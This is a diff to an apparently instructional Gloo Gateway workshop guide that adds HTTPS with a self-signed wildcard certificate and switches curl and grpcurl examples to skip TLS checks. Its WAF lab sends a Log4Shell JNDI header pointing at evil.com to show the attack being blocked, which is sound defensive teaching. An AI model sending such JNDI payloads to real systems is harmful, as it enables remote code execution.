@@ -113,7 +113,7 @@ kubectl apply -f install/gloo-gateway.yaml
 ```sh
 until kubectl get service/gloo-gateway -n gloo-gateway --output=jsonpath='{.status.loadBalancer}' | grep "ingress"; do : ; done
 export GLOO_GATEWAY=$(kubectl -n gloo-gateway get svc gloo-gateway -o jsonpath='{.status.loadBalancer.ingress[0].*}')
-printf "\n\nGloo Gateway available at http://$GLOO_GATEWAY\n"
+printf "\n\nGloo Gateway available at https://$GLOO_GATEWAY\n"
 ```
 
 4. You need to setup your cluster environment to enable all the API gateway features. The below script deploys the optional `gloo-mesh-addons` features that enable features such as external authorization and rate limiting. Finally, you will also deploy your own OIDC provider `keycloak` which will allow you to secure your website with a user/pass login. 
@@ -142,6 +142,17 @@ export KEYCLOAK_CLIENTID=$(kubectl get configmap -n gloo-mesh keycloak-info -o j
 export KEYCLOAK_URL=http://$(kubectl -n keycloak get service keycloak -o jsonpath='{.status.loadBalancer.ingress[0].*}'):9000/auth
 
 printf "\n\nKeycloak OIDC ClientID: $KEYCLOAK_CLIENTID\n\nKeycloak URL: $KEYCLOAK_URL\n"
+
+# https
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+   -keyout tls.key -out tls.crt -subj "/CN=*"
+
+kubectl -n gloo-gateway create secret generic tls-secret \
+--from-file=tls.key=tls.key \
+--from-file=tls.crt=tls.crt
+
+rm tls.crt tls.key
+
 ```
 
 ## Lab 4 - Deploy Online Boutique Sample Application<a name="Lab-4"></a>
@@ -240,10 +251,16 @@ spec:
         labels:
           istio: ingressgateway
         namespace: gloo-gateway
-  listeners: 
+  listeners:
     - http: {}
       port:
         number: 80
+    - http: {}
+      port:
+        number: 443
+      tls:
+        mode: SIMPLE
+        secretName: tls-secret # NOTE
       allowedRouteTables:
         - host: '*'
           selector:
@@ -302,7 +319,7 @@ EOF
 * Open browser
 
 ```sh
-printf "\n\nOnline Boutique available at http://$GLOO_GATEWAY\n"
+printf "\n\nOnline Boutique available at https://$GLOO_GATEWAY\n"
 ```
 
 You've successfully exposed the frontend application thru the Gloo Gateway.
@@ -345,7 +362,7 @@ EOF
 The currencyservice converts units from one currency to another. Test the currencyservice by using the [`grpcurl`](https://github.com/fullstorydev/grpcurl/releases) utility to send traffic:
 
 ```sh
-grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:80 hipstershop.CurrencyService/Convert
+grpcurl --insecure --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:443 hipstershop.CurrencyService/Convert
 ```
 
 * We sent the following request:
@@ -467,7 +484,7 @@ In this section of the lab, take a quick look at how to prevent the `log4j` expl
 2. Confirm that a malicious JNDI request currently succeeds. Note the `200` success response. Later, you create a WAF policy to block such requests.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://$GLOO_GATEWAY/httpbin/get
 ```
 
 3. With the Gloo WAF policy custom resource, you can create reusable policies for ModSecurity. Review the `log4j` WAF policy and the frontend route table. Note the following settings.
@@ -503,7 +520,7 @@ EOF
 4. Try the previous request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY/httpbin/get
+curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" https://$GLOO_GATEWAY/httpbin/get
 ```
 
 Note that the request is now blocked with the custom intervention message from the WAF policy.
@@ -583,19 +600,19 @@ EOF
 3. Call httpbin without an api key and you will get a 401 unauthorized message.
 
 ```sh
-curl -v http://$GLOO_GATEWAY/httpbin/get
+curl -k https://$GLOO_GATEWAY/httpbin/get
 ```
 
 4. Call httpbin with the developer api key `x-api-key: developer`
 
 ```sh
-curl -H "x-api-key: developer" -v http://$GLOO_GATEWAY/httpbin/get
+curl -H "x-api-key: developer" -k https://$GLOO_GATEWAY/httpbin/get
 ```
 
 5. Call httpbin with the admin api key `x-api-key: admin`
 
 ```sh
-curl -H "x-api-key: admin" -v http://$GLOO_GATEWAY/httpbin/get
+curl -H "x-api-key: admin" -k https://$GLOO_GATEWAY/httpbin/get
 ```
 
 ## Lab 10 - Authentication / JWT + JWKS<a name="Lab-10"></a>
@@ -689,13 +706,13 @@ printf "\n\n Access Token: $ACCESS_TOKEN\n"
 4. Try calling currency service with no access token. You will need `grpcurl` installed and it can be downloaded here: [grpcurl installation](https://github.com/fullstorydev/grpcurl#installation)
 
 ```sh
-grpcurl --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:80 hipstershop.CurrencyService/Convert
+grpcurl --insecure --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:443 hipstershop.CurrencyService/Convert
 ```
 
 5. Call currency service with an access token
 
 ```sh
-grpcurl -H "Authorization: Bearer ${ACCESS_TOKEN}" --plaintext --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:80 hipstershop.CurrencyService/Convert
+grpcurl -H "Authorization: Bearer ${ACCESS_TOKEN}" --insecure --proto ./install/online-boutique/online-boutique.proto -d '{ "from": { "currency_code": "USD", "nanos": 44637071, "units": "31" }, "to_code": "JPY" }' $GLOO_GATEWAY:443 hipstershop.CurrencyService/Convert
 ```
 
 ## Lab 11 - Authentication / OIDC<a name="Lab-11"></a>
@@ -703,59 +720,6 @@ grpcurl -H "Authorization: Bearer ${ACCESS_TOKEN}" --plaintext --proto ./install
 ![Keycloak](images/keycloak.png)
 
 Another valuable feature of API gateways is integration into your IdP (Identity Provider). In this section of the lab, we see how Gloo Gateway can be configured to redirect unauthenticated users via OIDC.  We will use Keycloak as our IdP, but you could use other OIDC-compliant providers in your production clusters.
-
-1. In order for OIDC to work we need to enable HTTPS on our gateway. For this demo, we will create and upload a self-signed certificate which will be used in the gateway for TLS termination.
-
-```sh
-openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
-   -keyout tls.key -out tls.crt -subj "/CN=*"
-
-kubectl -n gloo-gateway create secret generic tls-secret \
---from-file=tls.key=tls.key \
---from-file=tls.crt=tls.crt
-
-rm tls.crt tls.key
-```
-
-2. Adding HTTPS to our gateway is simple as updating the virtual gateway to use our ssl certificate.
-
-```yaml
-kubectl apply -f - <<EOF
-apiVersion: networking.gloo.solo.io/v2
-kind: VirtualGateway
-metadata:
-  name: north-south-gw
-  namespace: ops-team
-spec:
-  workloads:
-    - selector:
-        labels:
-          istio: ingressgateway
-        cluster: mgmt-cluster
-        namespace: gloo-gateway
-  listeners:
-    - http: {}
-      port:
-        number: 80
-      httpsRedirect: true
-    - http: {}
-      port:
-        number: 443
-      tls:
-        mode: SIMPLE
-        secretName: tls-secret # NOTE
-      allowedRouteTables:
-        - host: '*'
-          selector:
-            workspace: ops-team
-EOF
-```
-
-3. Test out the new HTTPS endpoint (you may need to allow insecure traffic in your browser. Chrome: Advanced -> Proceed)
-
-```sh
-echo "Secure Online Boutique URL: https://$GLOO_GATEWAY"
-```
 
 The `ExtAuthPolicy` defines the provider connectivity including any callback paths that we need to configure on our application.
 
